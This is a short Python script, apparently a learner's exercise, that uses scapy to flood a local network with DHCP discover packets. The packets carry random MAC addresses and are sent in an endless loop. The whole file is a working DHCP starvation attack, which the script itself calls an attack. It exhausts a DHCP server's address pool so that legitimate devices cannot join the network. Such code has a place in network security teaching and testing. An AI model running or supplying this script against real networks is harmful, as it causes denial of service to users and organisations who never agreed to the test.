#!/usr/bin/env python3


from scapy.all import Ether, IP, UDP, BOOTP, DHCP, RandMAC, conf, sendp
import sys

# Imported the modules from scapy to build a packet and also sys to pass arg phrases


if len(sys.argv) == 2:  # Here i check that the right amound of arguments are passed
    try:
        conf.checkIPaddr = False  # This configuration unsets the checking if the ip that is sent is valid or not

        mac = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        port = UDP(sport=68, dport=67)
        op = BOOTP(op=1, chaddr=RandMAC())
        dhcp_msg = DHCP(options=[('message-type', 'discover'), ('end')])
        # Here i build the packet components mac address, ip address, ports, bootstrap protocol request, and the type of dhcp message

        packet = mac / ip / port / op / dhcp_msg
        # Here i build the packet

        print("-" * 50)
        print(f"Starving {sys.argv[1]}")
        print("-" * 50)

        sendp(packet, iface=sys.argv[1], loop=1,
              verbose=1)  # In this section i send the packet i built to the interface in a loop

    except Exception as e:
        print(f"There was an error in executing the attack: {e}")
else:
    print("Syntax Error")
    print("Usage: python3 dhAFRCIA.py <interface>")
